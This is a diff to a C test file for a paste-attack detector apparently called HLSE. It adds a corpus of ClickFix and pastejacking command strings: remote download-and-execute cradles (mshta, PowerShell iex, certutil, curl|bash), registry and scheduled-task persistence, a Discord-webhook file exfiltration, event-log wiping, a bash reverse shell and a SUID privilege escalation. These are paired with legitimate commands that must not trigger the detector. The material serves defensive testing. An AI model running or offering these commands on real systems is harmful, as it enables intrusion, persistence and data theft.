@@ -12,7 +12,8 @@
  * 国民生活センター reports, and ordinary professional communications.
  *
  * Build: gcc -O2 -o tests/corpus_ext tests/hlse_corpus_extended.c \
- *            hlse_core.c hlse_text.c -I. -D_POSIX_C_SOURCE=200809L
+ *            hlse_core.c hlse_text.c hlse_supply.c hlse_util.c \
+ *            -I. -D_POSIX_C_SOURCE=200809L
  */
 
 #define _POSIX_C_SOURCE 200809L
@@ -20,6 +21,7 @@
 #include <stdio.h>
 #include <string.h>
 #include "../hlse_text.h"
+#include "../hlse_supply.h"
 
 typedef struct {
     int  score;
@@ -176,14 +178,92 @@ static struct ext_text_case ext_text_corpus[] = {
     { NULL, 0, NULL }
 };
 
+struct ext_paste_case {
+    const char *text;
+    int         min_score;
+    const char *desc;
+};
+
+/* Real-world ClickFix / pastejacking attack strings, transcribed from
+ * public incident write-ups (fake-CAPTCHA "Run dialog" lures, Discord
+ * webhook exfil, LOLBin download cradles). These were NOT written to
+ * match our own needle table — that is the point of this section.   */
+static struct ext_paste_case ext_paste_corpus[] = {
+    /* Fake-CAPTCHA ClickFix: victim pastes into Win+R / a terminal */
+    { "mshta.exe https://files.example.net/captcha-verify.hta", 65,
+      "ClickFix: mshta remote HTA execution" },
+    { "mshta.exe hxxps://files.example.net/captcha-verify.hta", 65,
+      "ClickFix: defanged hxxps scheme (write-up form)" },
+    { "powershell -w hidden -ep bypass -c \"iex (iwr "
+      "'https://cdn-assets.example.net/fix.ps1')\"", 65,
+      "ClickFix: hidden PowerShell download-execute cradle" },
+    { "iwr -Uri https://cdn-assets.example.net/a.ps1 "
+      "-UseBasicParsing | iex", 65,
+      "ClickFix: iwr|iex download cradle" },
+    { "certutil.exe -urlcache -split -f https://cdn-assets.example.net/"
+      "payload.exe %temp%\\payload.exe", 65,
+      "ClickFix: certutil remote file download" },
+    { "bitsadmin /transfer update https://cdn-assets.example.net/e.exe "
+      "%temp%\\e.exe", 65,
+      "ClickFix: bitsadmin remote file transfer" },
+    { "expand.exe \\\\cdn-assets.example.net\\share\\stage.cab "
+      "%temp%\\stage.cab", 65,
+      "ClickFix: expand.exe remote CAB pull" },
+    { "msiexec /q /i https://cdn-assets.example.net/pkg.msi", 65,
+      "ClickFix: msiexec silent remote MSI install" },
+
+    /* Kill-chain follow-through: persistence / exfil / evasion */
+    { "schtasks /create /sc onlogon /tn UpdateCheck "
+      "/tr C:\\Users\\Public\\x.exe /ru SYSTEM", 55,
+      "Post-delivery: SYSTEM scheduled-task persistence" },
+    { "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
+      "/v svchost /d C:\\Users\\Public\\x.exe", 55,
+      "Post-delivery: Run-key persistence" },
+    { "curl -X POST -F \"file=@loot.zip\" "
+      "https://discord.com/api/webhooks/123456/abc", 55,
+      "Exfil: Discord webhook file upload" },
+    { "wevtutil cl Security", 55,
+      "Anti-forensics: Security event-log wipe" },
+    { "bash -i >& /dev/tcp/10.0.0.5/443 0>&1", 60,
+      "Reverse shell: bash /dev/tcp" },
+    { "chmod u+s /bin/bash", 55,
+      "Privesc: SUID bit on /bin/bash" },
+    { "npx http://cdn-assets.example.net/tool", 65,
+      "Download-execute: npx remote package" },
+    { "sudo curl -fsSL https://cdn-assets.example.net/install.sh "
+      "| sudo bash", 85,
+      "Download-execute: curl|sh pipe (documented lure shape)" },
+    { "osascript -e 'do shell script \"curl -s "
+      "https://cdn-assets.example.net/x.sh|bash\"'", 65,
+      "macOS ClickFix: osascript shell exec (AMOS/Atomic lure)" },
+
+    /* Legitimate commands that must NOT fire */
+    { "git clone https://github.com/git/git.git", 0,
+      "Legit: git clone from github" },
+    { "scp file.txt user@server:/tmp/", 0,
+      "Legit: scp to own server" },
+    { "ssh user@example.com uptime", 0,
+      "Legit: ssh to own server" },
+    { "Get-ChildItem -Recurse C:\\Users", 0,
+      "Legit: PowerShell directory listing" },
+    { "reg query HKLM\\Software", 0,
+      "Legit: read-only registry query" },
+    { "xcode-select --install", 0,
+      "Legit: macOS toolchain install" },
+
+    { NULL, 0, NULL }
+};
+
 int
 main(void) {
     int n_url = 0, url_pass = 0;
     int n_text = 0, text_pass = 0;
+    int n_paste = 0, paste_pass = 0;
     int detected_url = 0, expected_url = 0;
     int detected_text = 0, expected_text = 0;
-    int fp_url = 0, fp_text = 0;
-    int legit_url_count = 0, legit_text_count = 0;
+    int detected_paste = 0, expected_paste = 0;
+    int fp_url = 0, fp_text = 0, fp_paste = 0;
+    int legit_url_count = 0, legit_text_count = 0, legit_paste_count = 0;
     int i;
 
     printf("HLSE Core — Extended (Bias-Reduced) Corpus\n");
@@ -229,9 +309,31 @@ main(void) {
         }
     }
 
-    int total_tp = detected_url + detected_text;
-    int total_fp = fp_url + fp_text;
-    int total_fn = (expected_url - detected_url) + (expected_text - detected_text);
+    printf("\n── Paste/ClickFix attack patterns ─────────\n");
+    for (i = 0; ext_paste_corpus[i].text; i++) {
+        PasteVerdict v = hlse_check_paste(ext_paste_corpus[i].text);
+        int expect_threat = ext_paste_corpus[i].min_score > 0;
+        int got_threat = v.score >= 40;
+        int ok = expect_threat ? (v.score >= ext_paste_corpus[i].min_score)
+                                : (v.score < 40);
+        n_paste++;
+        printf("%s [%3d] %.55s\n",
+               ok ? "PASS" : "FAIL", v.score, ext_paste_corpus[i].desc);
+        if (ok) paste_pass++;
+        if (expect_threat) {
+            expected_paste++;
+            if (got_threat) detected_paste++;
+        } else {
+            legit_paste_count++;
+            if (got_threat) fp_paste++;
+        }
+    }
+
+    int total_tp = detected_url + detected_text + detected_paste;
+    int total_fp = fp_url + fp_text + fp_paste;
+    int total_fn = (expected_url - detected_url) +
+                   (expected_text - detected_text) +
+                   (expected_paste - detected_paste);
     double precision = (total_tp + total_fp) > 0
         ? (double)total_tp / (total_tp + total_fp) : 1.0;
     double recall = (total_tp + total_fn) > 0
@@ -244,12 +346,15 @@ main(void) {
            url_pass, n_url, detected_url, expected_url, fp_url, legit_url_count);
     printf("Text: %d/%d cases pass, recall %d/%d, FP %d/%d\n",
            text_pass, n_text, detected_text, expected_text, fp_text, legit_text_count);
+    printf("Paste: %d/%d cases pass, recall %d/%d, FP %d/%d\n",
+           paste_pass, n_paste, detected_paste, expected_paste,
+           fp_paste, legit_paste_count);
     printf("Combined precision=%.3f recall=%.3f F1=%.3f (out-of-distribution)\n",
            precision, recall, f1);
     printf("Acceptance threshold: 0.75 (out-of-distribution data)\n\n");
 
-    int total_pass = url_pass + text_pass;
-    int total = n_url + n_text;
+    int total_pass = url_pass + text_pass + paste_pass;
+    int total = n_url + n_text + n_paste;
     if (f1 >= 0.75 && total_pass >= (total * 80 / 100)) {
         printf("EXTENDED CORPUS PASSED (F1=%.3f, %d/%d cases)\n",
                f1, total_pass, total);
